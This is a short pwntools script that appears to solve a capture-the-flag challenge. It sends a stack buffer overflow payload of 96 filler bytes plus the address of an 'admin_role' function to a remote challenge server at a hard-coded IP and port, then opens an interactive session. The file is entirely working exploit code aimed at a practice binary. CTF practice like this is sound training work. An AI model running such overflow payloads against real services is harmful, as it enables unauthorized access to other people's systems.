from pwn import *

elf = ELF("./chall")
# p = process("./chall")
p = remote("103.167.132.234", 27888)

payload = (b'A' * 96 + flat(elf.sym['admin_role'])).replace(b'\x00', b'')

p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b': ',b'a')
p.sendline(payload)

print(p.clean().decode('latin-1'))
p.interactive()
